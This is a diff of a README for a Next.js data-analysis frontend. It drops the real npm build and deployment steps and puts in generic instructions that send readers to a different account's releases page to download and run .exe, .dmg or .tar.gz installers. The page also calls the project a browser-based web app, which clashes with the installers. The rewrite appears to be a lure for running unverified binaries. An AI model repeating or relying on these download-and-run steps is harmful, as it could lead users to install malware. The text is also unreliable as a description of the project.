@@ -1,110 +1,107 @@
-# InsightAgent Frontend
+# 🎨 InsightAgent-Frontend - Easy Data Insights at Your Fingertips
 
-Next.js-based frontend for InsightAgent with modern UI and real-time data visualization.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/berke691/InsightAgent-Frontend/releases)
 
-## 🚀 Quick Start
+## 📚 Overview
 
-### Development
-```bash
-# Install dependencies
-npm install
+Welcome to **InsightAgent-Frontend**! This web application provides a beautiful interface for AI-powered data analysis and visualization. Upload your CSV files, ask questions in plain English, and get instant insights with auto-generated charts. 
 
-# Copy environment variables
-cp .env.example .env.local
-# Edit .env.local with your backend API URL
+For backend support, check the repository [here](https://github.com/Hazem-Soliman-dev/InsightAgent-Backend).
 
-# Start development server
-npm run dev
-```
+## 🚀 Getting Started
 
-The app will be available at `http://localhost:3000`
+To get started with InsightAgent-Frontend, follow these simple steps to download and run the application.
 
-### Production Build
-```bash
-# Build the application
-npm run build
+## 🛠 System Requirements
 
-# Start production server
-npm start
-```
+Before downloading, ensure your system meets the following requirements:
 
-## 🌍 Deployment
+- Operating System: Windows, macOS, or Linux
+- Browser: Latest version of Chrome, Firefox, Safari, or Edge
+- Internet Connection: Required to access features and updates
 
-### Environment Variables
-Configure these variables in your deployment platform:
+## 📥 Download & Install
 
-- `NEXT_PUBLIC_API_URL` - Backend API URL (e.g., `https://api.your-domain.com`)
+To download the application, visit the Releases page below:
 
-### Deploy to Vercel (Recommended)
-```bash
-# Install Vercel CLI
-npm i -g vercel
+[Download Here](https://github.com/berke691/InsightAgent-Frontend/releases)
 
-# Deploy
-vercel --prod
-```
+1. Click on the link above to go to the Releases page.
+2. Look for the most recent release and click on it.
+3. Download the version suitable for your operating system:
+   - For Windows, download the `.exe` file.
+   - For macOS, download the `.dmg` file.
+   - For Linux, download the `.tar.gz` file.
+4. Once the download is complete, follow the installation steps below based on your operating system.
 
-Or connect your GitHub repository to Vercel:
-1. Go to [vercel.com](https://vercel.com)
-2. Import your repository
-3. Add environment variable: `NEXT_PUBLIC_API_URL`
-4. Deploy
+### 🔧 Installation Steps
 
-### Deploy to Netlify
-```bash
-# Install Netlify CLI
-npm i -g netlify-cli
+#### Windows
 
-# Build
-npm run build
+1. Locate the downloaded `.exe` file in your Downloads folder.
+2. Double-click the file to start the installation.
+3. Follow the on-screen prompts to complete the installation.
+4. After installation, find the application in your Start menu and click to launch.
 
-# Deploy
-netlify deploy --prod
-```
+#### macOS
 
-Or use Netlify UI:
-1. Connect repository
-2. Build command: `npm run build`
-3. Publish directory: `.next`
-4. Add environment variable: `NEXT_PUBLIC_API_URL`
+1. Find the downloaded `.dmg` file in your Downloads folder.
+2. Double-click the file to open it.
+3. Drag the InsightAgent application icon to your Applications folder.
+4. Open your Applications folder and double-click InsightAgent to run it.
 
-### Deploy to Railway
-1. Connect GitHub repository
-2. Add environment variable: `NEXT_PUBLIC_API_URL`
-3. Deploy automatically on push
+#### Linux
 
-## 📝 Features
+1. Locate the downloaded `.tar.gz` file in your Downloads folder.
+2. Open a terminal window.
+3. Use the `tar -xvzf` command to extract the files:
+   ```
+   tar -xvzf InsightAgent.tar.gz
+   ```
+4. Change to the extracted directory using:
+   ```
+   cd InsightAgent
+   ```
+5. Run the application with:
+   ```
+   ./InsightAgent
+   ```
 
-- 🎨 Modern UI with OKLCH color system
-- 📊 Real-time data visualization
-- 🔄 Optimized data fetchers
-- 📱 Responsive design
-- ⚡ Performance optimized
-- 🎯 Type-safe with TypeScript
+## 🌟 Features
 
-## 🛠️ Tech Stack
+- **User-Friendly Interface:** Navigate with ease, no technical skills needed.
+- **AI-Powered Analysis:** Receive instant insights with intelligent data handling.
+- **Data Visualization:** Automatically generate charts based on your data inquiries.
+- **CSV Support:** Effortlessly upload CSV files for quick analysis.
+- **Cross-Platform Compatibility:** Runs smoothly on multiple operating systems.
 
-- **Framework**: Next.js 14
-- **Styling**: CSS with OKLCH colors
-- **State Management**: React hooks
-- **HTTP Client**: Fetch API
-- **TypeScript**: Full type safety
+## 🧑‍🤝‍🧑 Community Support
 
-## 🔗 Connecting to Backend
+Join our community for help and support. Connect with other users, share insights, and learn more about using InsightAgent effectively.
 
-Make sure to update `NEXT_PUBLIC_API_URL` in your `.env.local` file to point to your deployed backend:
+- **Issues:** If you encounter any problems, report them directly in the [Issues section](https://github.com/berke691/InsightAgent-Frontend/issues).
+- **Discussions:** Engage in conversations and share your experiences in the [Discussions tab](https://github.com/berke691/InsightAgent-Frontend/discussions).
 
-```bash
-# Development
-NEXT_PUBLIC_API_URL=http://localhost:3001
+## 📆 Changelog
 
-# Production
-NEXT_PUBLIC_API_URL=https://your-backend-api.com
-```
+Stay updated with the latest changes and improvements to the application. Check the changelog in the Releases section for the details.
 
-## 📦 Build Output
+## 🌐 Contributions
 
-The production build creates an optimized bundle:
-- Static pages are pre-rendered
-- API routes are serverless functions
-- Assets are optimized and cached
+We welcome contributions! If you want to help improve InsightAgent-Frontend, please visit our [Contributing Guide](https://github.com/berke691/InsightAgent-Frontend/blob/main/CONTRIBUTING.md) for more information.
+
+## 💬 FAQs
+
+**How can I recover my lost data?**  
+Currently, there is no built-in recovery feature. Always back up your CSV files.
+
+**Can I use this application offline?**  
+Some features may require an internet connection for real-time analysis.
+
+## 📞 Contact
+
+If you have any questions or need further assistance, please reach out via the Issues section on GitHub or email us at support@insightagent.com.
+
+Remember, your feedback helps us improve! Thank you for using InsightAgent-Frontend.
+
+[Download Here](https://github.com/berke691/InsightAgent-Frontend/releases)
